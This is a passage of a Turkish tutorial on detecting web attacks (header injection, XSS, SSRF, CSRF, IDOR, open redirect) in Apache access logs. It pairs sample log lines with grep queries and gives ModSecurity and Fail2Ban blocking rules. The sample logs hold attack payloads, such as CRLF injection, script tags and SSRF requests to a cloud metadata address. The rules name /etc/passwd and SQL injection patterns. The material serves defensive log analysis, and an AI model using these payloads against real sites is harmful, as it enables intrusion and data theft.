* Aynı türden şüpheli isteklerin tekrarlanması

### Apache Erişim Kayıtlarında HTTP Başlık Enjeksiyonu Tespiti

HTTP Başlık Enjeksiyonu saldırısı içeren örnek apache logu verilmiştir:

```log
192.168.1.280 - - [01/Jun/2025:19:30:10 +0300] "GET /redirect?url=http://example.com%0d%0aSet-Cookie:%20malicious=1 HTTP/1.1" 302 512 "-" "Mozilla/5.0"  
192.168.1.281 - - [01/Jun/2025:19:31:05 +0300] "GET /page?lang=en%0d%0aContent-Length:%2000 HTTP/1.1" 200 1024 "-" "curl/7.68.0"
```

Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir:

```bash
grep -iE "%0d|%0a|\r|\n" /var/log/apache2/access.log
```

---

## İçerik Enjeksiyonu (Content Injection)

Content Injection, bir saldırganın web uygulamasına veya web sayfasına kötü niyetli içerik enjekte ederek, ziyaretçilere zararlı veya istenmeyen içerik göstermesini sağlayan bir güvenlik açığıdır.

Bu saldırı, genellikle kullanıcı girdilerinin doğru şekilde filtrelenmemesi sonucu ortaya çıkar ve HTML, JavaScript, metin ya da diğer içeriklerin içine kötü amaçlı kod eklenmesine yol açar.

İçerik enjeksiyonu, web sitesinin görünümünü veya işlevselliğini bozebilir, kullanıcıları phishing (oltalama) saldırılarına veya kötü amaçlı yazılım dağıtımına maruz bırakabilir.

### Content Injection Göstergeleri (İndikatörleri)

Apache erişim loglarında dikkat edilmesi gereken işaretler:

* URL parametrelerinde veya form verilerinde şüpheli HTML/JavaScript kod parçaları
* Parametrelerde `&lt;script&gt;`, `&lt;iframe>`, `on-error=`, `javascript:` gibi zararlı içerik ifadeleri
* Anormal uzunlukta veya karmaşık kod parçaları içeren istekler
* Sunucudan beklenmedik içerik tipleri veya hata kodları
* Tekrarlayan aynı tip zararlı içerik denemeleri

### Apache Erişim Loglarında Content Injection Tespiti

Content Injection saldırısı içeren örnek apache logu verilmiştir:

```log
192.168.1.330 - - [01/Jun/2025:22:30:10 +0300] "GET /search?q=<div style='color:red'>Hacked</div> HTTP/1.1" 200 2048 "-" "Mozilla/5.0"  
192.168.1.331 - - [01/Jun/2025:22:31:05 +0300] "POST /comment HTTP/1.1" 200 1024 "-" "curl/7.68.0"
192.168.1.320 - - [01/Jun/2025:22:00:10 +0300] "GET /search?q=&lt;script&gt;alert-msg('xss')&lt;/script&gt; HTTP/1.1" 200 2048 "-" "Mozilla/5.0"  
192.168.1.321 - - [01/Jun/2025:22:01:05 +0300] "POST /comment HTTP/1.1" 200 1024 "-" "curl/7.68.0"
```

Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir:

```bash
grep -E "<html|<div|<span|<table|&lt;script|&lt;/script&gt;" /var/log/apache2/access.log
```

---

## XSS (Cross-Site Scripting)

![Siteler Arası Komut Dosyası Çalıştırma XSS](cross-site-scriptingxss.webp)

XSS, bir web uygulamasına kötü amaçlı JavaScript veya HTML kodu enjekte edilerek, bu kodun diğer kullanıcıların tarayıcılarında çalıştırılmasıdır. Tüm XSS saldırıları içerik enjeksiyonudur (Content Injection), fakat tüm içerik enjeksiyonları XSS değildir. Amaç, kullanıcı oturumlarını çalmak, zararlı yazılımlar bulaştırmak veya kullanıcıları yanıltmaktır. XSS saldırıları üçe ayrılır:

* **Stored (Saklanan) XSS:** Zararlı kod veritabanına veya kalıcı alanlara kaydedilir ve her kullanıcıya gösterilir.
* **Reflected (Yansıtılan) XSS:** Zararlı kod, URL veya form aracılığıyla geçici olarak yansıtılır.
* **DOM-based XSS:** Zararlı kod, kullanıcı tarafında (tarayıcıda) DOM manipülasyonu yoluyla çalıştırılır.

### XSS Saldırısının Göstergeleri (İndikatörleri)

Apache erişim loglarında XSS işaretleri genellikle şunlar olur:

* URL veya parametrelerde `&lt;script&gt;`, `&lt;/script&gt;`, `alert-msg(`, `on-error=`, `javascript:` gibi JavaScript veya HTML etiketleri
* Kodlanmış HTML karakterleri: `%3C` ( < ), `%3E` ( > ), `%22` ( " ), `%27` ( ' )
* Parametrelerde anormal uzunlukta ve karmaşık karakter dizileri

Örnek parametreler:  
`q=&lt;script&gt;alert-msg('XSS')&lt;/script&gt;`  
`search=%3Cimg%20src=x%20on-error=alert-msg(1)%3E`

### Apache Erişim Loglarında XSS Tespiti

XSS saldırısı içeren örnek apache logu verilmiştir:

```log
192.168.1.150 - - [01/Jun/2025:11:20:35 +0300] "GET /search?q=`&lt;script&gt;alert-msg('XSS')&lt;/script&gt;` HTTP/1.1" 200 1024 "-" "Mozilla/5.0"  
192.168.1.151 - - [01/Jun/2025:11:21:12 +0300] "GET /profile?name=%3Cimg%20src=x%20on-error=alert-msg(1)%3E HTTP/1.1" 200 2048 "-" "Mozilla/5.0"
```

Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir:

```bash
grep -iE "&lt;script|alert|on-error|javascript:" /var/log/apache2/access.log
```

---

## SSRF (Server-Side Request Forgery)

![Sunucu Tarafı İstek Sahteciliği SSRF](ssrf.webp)

SSRF, saldırganın, hedef sunucunun kendisi veya erişebildiği diğer iç sistemlere zararlı istekler göndermesini sağladığı bir güvenlik açığıdır.

Saldırgan, uygulamanın kullanıcıdan aldığı URL ya da IP adresi gibi girdileri manipüle ederek, sunucunun yetkisiz kaynaklara erişmesine neden olur. Bu sayede iç ağdaki sistemlere sızabilir, hassas verilere ulaşabilir veya sistemde başka saldırılar gerçekleştirebilir.

### SSRF Göstergeleri (İndikatörleri)

Apache erişim loglarında gözlemlenebilecek işaretler:

* URL parametrelerinde şüpheli IP adresleri veya localhost adresleri (`127.0.0.1`, `localhost`, `169.254.x.x`, `10.x.x.x`, `192.168.x.x`)
* Beklenmedik veya uygulama dışı URL'lere yapılan istekler
* Sunucunun kendi IP adresine ya da özel ağ adreslerine yönelik sık istekler
* Uzun URL parametreleri veya URL içi kodlama (encoding) kullanımı
* Aynı IP'den çok sayıda farklı hedefe yönelik istek denemeleri

### Apache Erişim Loglarında SSRF Tespiti

SSRF saldırısı içeren örnek apache logu verilmiştir:

```log
192.168.1.300 - - [01/Jun/2025:20:15:10 +0300] "GET /fetch?url=http://127.0.0.1/admin HTTP/1.1" 200 1024 "-" "Mozilla/5.0"  
192.168.1.301 - - [01/Jun/2025:20:16:05 +0300] "GET /api/proxy?target=http://169.254.169.254/latest/meta-data/ HTTP/1.1" 200 512 "-" "curl/7.68.0"
```

Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir:

```bash
grep -iE "127\.0\.0\.1|localhost|169\.254|10\.|192\.168" /var/log/apache2/access.log
```

---

## CSRF (Cross-Site Request Forgery)

![Siteler Arası İstek Sahteciliği CSRF](csrf.webp)

CSRF, kullanıcıların yetkili olduğu bir web uygulamasına, kötü niyetli bir sitenin kullanıcı adına istek göndermesini sağlayan saldırı türüdür. Kullanıcı farkında olmadan, yetkilerini kötü amaçlarla kullanan istekler yapılır.

Örneğin, kullanıcı oturumu açıkken kötü amaçlı bir linke tıkladığında veya bir form gönderdiğinde, saldırganın istediği işlemler gerçekleşebilir.

### CSRF Göstergeleri (İndikatörleri)

Apache erişim loglarında direkt tespiti zor olsa da dolaylı göstergeler şunlar olabilir:

* Beklenmedik POST veya GET istekleri
* Aynı IP veya kullanıcı ajanından farklı oturumlar için anormal sayıda işlem
* Anormal ve tekrar eden belirli endpoint'lere yönelik istekler
* İsteklerde referer (yönlendiren site) başlığının olmaması veya şüpheli olması
* Oturum açmış kullanıcılar için beklenmeyen yetki gerektiren işlemler

### Apache Erişim Loglarında CSRF Tespiti

CSRF saldırısı içeren örnek apache logu verilmiştir:

```log
192.168.1.310 - - [01/Jun/2025:21:10:15 +0300] "POST /account/change-email HTTP/1.1" 200 512 "-" "Mozilla/5.0"  
192.168.1.310 - - [01/Jun/2025:21:10:17 +0300] "POST /account/change-email HTTP/1.1" 200 512 "http://malicious-site.com" "Mozilla/5.0"
```

Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir. Apache loglarından doğrudan CSRF saldırısını kesin olarak tespit etmek zor olsa da, Referer kontrolü ve anormal istek davranışları tespiti için log analizi yapılabilir.

```bash
grep -E "POST /critical-endpoint" /var/log/apache2/access.log | grep "Referer: http"
```

---

## IDOR (Insecure Direct Object Reference)

![Güvensiz Doğrudan Nesne Referansı IDOR](idor.webp)

IDOR, bir kullanıcının yetkisi olmadan doğrudan başka bir kullanıcının verilerine veya nesnelerine erişim sağlayabildiği bir güvenlik açığıdır. Web uygulamaları, kaynaklara (dosyalar, kullanıcı verileri, kayıtlar vb.) erişirken, nesne referanslarını (örneğin dosya isimleri, kullanıcı ID'leri, sipariş numaraları) doğrudan ve doğrulanmadan URL parametrelerinde kullanırsa, saldırgan bu referansları değiştirerek başkalarının verilerine erişebilir.

### IDOR Göstergeleri (İndikatörleri)

Apache erişim loglarında dikkat edilmesi gereken işaretler:

* URL parametrelerinde değiştirilebilir ve doğrudan nesne referansı içeren ID veya dosya isimleri (`user_id=123`, `file=report45.pdf`)
* Aynı IP'den veya kullanıcı ajanından farklı kullanıcıya ait ID'lere erişim denemeleri
* Anormal sıra dışı veya beklenmeyen nesne numaralarının URL parametrelerinde kullanılması
* Kısa süre içinde farklı nesnelere ardışık erişim denemeleri
* Oturum veya kimlik doğrulama kontrollerinin zayıf olduğu durumlarda, yetkisiz erişim istekleri

### Apache Erişim Loglarında IDOR Tespiti

IDOR saldırısı içeren örnek apache logu verilmiştir:

```log
192.168.1.370 - - [02/Jun/2025:00:10:05 +0300] "GET /profile?user_id=100 HTTP/1.1" 200 2048 "-" "Mozilla/5.0"  
192.168.1.370 - - [02/Jun/2025:00:10:20 +0300] "GET /profile?user_id=101 HTTP/1.1" 200 2048 "-" "Mozilla/5.0"  
192.168.1.370 - - [02/Jun/2025:00:10:35 +0300] "GET /profile?user_id=102 HTTP/1.1" 200 2048 "-" "Mozilla/5.0"
```

Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir:

```bash
grep "GET /profile?user_id=" /var/log/apache2/access.log
```

---

## Open Redirect (Açık Yönlendirme)

![Açık Yönlendirme](open-redirect.webp)

Open Redirect, bir web uygulamasının kullanıcıları başka bir URL'ye yönlendirmek için kullandığı parametrelerin kötüye kullanılması sonucu ortaya çıkan güvenlik açığıdır. Saldırgan, kullanıcıları zararlı veya sahte sitelere yönlendirmek için bu açıkları kullanır.

Bu saldırı türü, phishing (oltalama) saldırılarının yaygın bir aracıdır, kullanıcılar güvenilir bir siteye tıkladıklarını düşünürken, aslında zararlı bir siteye yönlendirilirler.

### Open Redirect Göstergeleri (İndikatörleri)

Apache erişim loglarında dikkat edilmesi gereken işaretler:

* URL parametrelerinde `redirect=`, `url=`, `next=`, `return=`, `dest=`, `continue=` gibi yönlendirme amaçlı parametreler
* Bu parametrelerde tam veya kısmi başka domain adreslerinin (ör. `http://malicious.com`) yer alması
* Aynı IP'den farklı zararlı URL'lere yönlendirme denemeleri
* Kısa süre içinde aynı parametreye farklı dış URL'lerin girilmesi
* HTTP durum kodu 3xx (301, 302, 307) olan isteklerde şüpheli yönlendirmeler

### Apache Erişim Loglarında Open Redirect Tespiti

Open Redirect saldırısı içeren örnek apache logu verilmiştir:

```log
192.168.1.380 - - [02/Jun/2025:00:45:10 +0300] "GET /login?redirect=http://malicious.com HTTP/1.1" 302 512 "-" "Mozilla/5.0"  
192.168.1.381 - - [02/Jun/2025:00:46:05 +0300] "GET /index?url=https://phishing-site.com HTTP/1.1" 302 512 "-" "Mozilla/5.0"
```

Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir:

```bash
grep -E "redirect=|url=|next=|return=|dest=|continue=" /var/log/apache2/access.log | grep -E "http://|https://"
```

---

## ModSecurity: Gerçek Zamanlı Saldırı Engelleme (WAF)

![ModSecurity WAF](modsecurity.webp)

Erişim loglarının manuel analizi adli analiz ve tehdit avcılığı için harika bir yöntem olsa da, aktif saldırıların gerçek zamanlı engellenmesi için bir Web Uygulaması Güvenlik Duvarı (WAF) gereklidir. ModSecurity, Apache modülü olarak çalışır ve gelen HTTP isteklerini daha web uygulamasına ulaşmadan denetler.

### Örnek: Dizin Gezinme (LFI) Engelleme Kuralı
Aşağıdaki ModSecurity kuralı, URI içinde `/etc/passwd` erişim denemelerini tespit ederek isteği bloklar ve istemciye `403 Forbidden` yanıtı döner:

```apache
SecRule REQUEST_URI "@contains etc/passwd" \
    "id:1000001,phase:2,deny,status:403,log,msg:'LFI Attempt Blocked: etc/passwd access'"
```

### Örnek: SQL Enjeksiyon Engelleme Kuralı
Bu kural, parametrelerde veya yollarda geçen yaygın `UNION SELECT` örüntülerini yakalar:

```apache
SecRule REQUEST_URI "@rx (?i)(union\s+select|select\s+.*\s+from)" \
    "id:1000002,phase:2,deny,status:403,log,msg:'SQL Injection Attempt Blocked'"
```

---

## Fail2Ban: Otomatik IP Engelleme

![Fail2Ban](fail2ban.webp)

Fail2Ban, log dosyalarını (örneğin `/var/log/apache2/access.log`) sürekli izleyerek belirli saldırı kalıplarını yakalar ve kuralı ihlal eden IP adreslerini güvenlik duvarı kuralları (iptables) üzerinden otomatik olarak engeller.

### Adım 1: Filtre Tanımı Oluşturma
`/etc/fail2ban/filter.d/apache-sqli.conf` adresinde bir filtre tanımlayın:

```ini
[Definition]
failregex = ^<HOST> - - \[.*\] "GET .*union.*select.*"
ignoreregex =
```

### Adım 2: Jail (Hapis) Yapılandırması
Bu filtreyi `/etc/fail2ban/jail.local` dosyasında etkinleştirin:

```ini
[apache-sqli]
enabled  = true
port     = http,https
filter   = apache-sqli
logpath  = /var/log/apache2/access.log
maxretry = 3
findtime = 600
bantime  = 3600
```

---

Apache web sunucuları, dünya genelinde en çok kullanılan ve güvenilir sunucu yazılımlarından biri olmasına rağmen, çeşitli web saldırılarına karşı her zaman savunmasız kalabilir. Bu nedenle, olası saldırıların tespiti ve önlenmesi için erişim loglarının düzenli olarak analiz edilmesi kritik öneme sahiptir.

Erişim loglarında görülebilecek anormal istekler, şüpheli parametreler ve beklenmedik dosya erişimleri, web sunucusunun hedef alındığını gösteren önemli ipuçlarıdır. Bu nedenle, logların etkin şekilde izlenmesi, otomatik analiz araçları ve güvenlik duvarları ile desteklenmeli, kullanıcı girdileri mutlaka filtrelenmeli ve güvenlik güncellemeleri düzenli olarak uygulanmalıdır.

Sonuç olarak, Apache web sunucusunda saldırı tespiti, güçlü bir güvenlik duruşu oluşturmanın temel taşlarından biridir. Proaktif yaklaşımlar, hem veri kaybını önler hem de sistemin sürekliliğini sağlar. Güvenlik, sadece bir teknoloji değil, sürekli takip ve iyileştirme gerektiren bir süreçtir.
